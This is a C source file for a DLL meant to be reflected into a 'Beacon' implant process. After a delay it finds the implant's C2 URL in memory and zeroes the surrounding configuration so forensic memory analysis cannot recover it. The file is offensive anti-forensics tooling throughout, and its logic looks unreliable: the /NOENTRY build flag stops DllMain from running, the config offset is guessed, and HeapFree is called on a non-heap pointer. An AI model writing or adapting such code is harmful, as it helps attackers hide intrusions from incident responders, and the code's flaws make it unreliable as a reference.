```c
// compile with: cl /MD /O2 /LD ScrubBeacon.c /link /NOENTRY
#include <windows.h>
#include <stdio.h>

#define MAX_SCRUB_SIZE 0x2000   // safety cap

DWORD WINAPI ScrubThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    // Wait for Beacon to finish its work
    Sleep(30000); // 30 seconds, configurable

    // Get handle to current process
    HANDLE hProcess = GetCurrentProcess();

    // Locate the module base (Beacon executable/DLL)
    HMODULE hMod = GetModuleHandleA(NULL);
    if (!hMod) return 1;

    // Scan .data section for a known C2 URL marker
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    PBYTE pDataStart = NULL, pDataEnd = NULL;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".data", 5) == 0) {
            pDataStart = (PBYTE)hMod + sec[i].VirtualAddress;
            pDataEnd   = pDataStart + sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!pDataStart) return 1;

    // Simple signature search: look for "http://" which appears in the C2 URL
    BYTE *pFound = NULL;
    const char *sig = "http://";
    for (BYTE *p = pDataStart; p < pDataEnd - strlen(sig); p++) {
        if (memcmp(p, sig, strlen(sig)) == 0) {
            pFound = p - 0x100; // heuristic: config starts a bit before the URL
            break;
        }
    }
    if (!pFound) return 1;

    // Estimate size (guarded by MAX_SCRUB_SIZE)
    SIZE_T scrubSize = 0x1000; // typical config+queue size
    if (scrubSize > MAX_SCRUB_SIZE) scrubSize = MAX_SCRUB_SIZE;

    // Change protection to writable
    DWORD oldProtect;
    if (!VirtualProtect(pFound, scrubSize, PAGE_READWRITE, &oldProtect))
        return 1;

    // Zero the memory securely
    SecureZeroMemory(pFound, scrubSize);

    // Restore original protection
    VirtualProtect(pFound, scrubSize, oldProtect, &oldProtect);

    // Optional: free if we can locate the heap handle (rarely needed)
    // Attempt to retrieve the process default heap and free the region
    HANDLE hHeap = GetProcessHeap();
    if (hHeap) {
        // HeapFree expects a pointer previously allocated with HeapAlloc.
        // If the buffer wasn't allocated via HeapAlloc, this call will simply fail, which is acceptable.
        HeapFree(hHeap, 0, pFound);
    }

    return 0;
}

// DllMain is used when the DLL is reflected into the Beacon process
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        HANDLE hThread = CreateThread(NULL, 0, ScrubThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
```

